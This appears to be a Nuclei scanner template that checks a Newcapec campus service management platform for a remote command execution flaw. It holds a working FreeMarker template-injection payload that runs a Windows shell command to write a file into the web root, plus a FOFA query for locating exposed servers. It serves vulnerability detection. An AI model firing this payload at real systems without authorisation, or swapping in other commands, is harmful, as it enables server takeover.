http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && status_code_2 == 200
    - contains(header_1, "text/plain") && contains(header_2, "text/plain")
    - contains(body_1, "{\"_result\":")
    - contains(body_2, "{{data}}")
    type: dsl
  raw:
  - '@timeout: 30s

    POST /service_transport/service.action HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd
    /c echo {{data}} > ./webapps/ROOT/{{file}}.txt\")}"}

    '
  - 'GET /{{file}}.txt HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    '
id: newcapec-rce
info:
  author: ritikchaddha
  description: 'Newcapec front-end service management platform service.action interface
    has a remote command execution vulnerability, attackers can use the vulnerability
    to obtain server permissions.

    '
  metadata:
    fofa-query: "title=\"\u638C\u4E0A\u6821\u56ED\u670D\u52A1\u7BA1\u7406\u5E73\u53F0\
      \""
    max-request: 2
  name: Newcapec - Remote Code Execution
  reference:
  - https://forum.butian.net/article/242
  severity: critical
  tags: newcapec,rce,intrusive,vuln
variables:
  data: '{{randstr}}'
  file: '{{rand_base(5)}}'
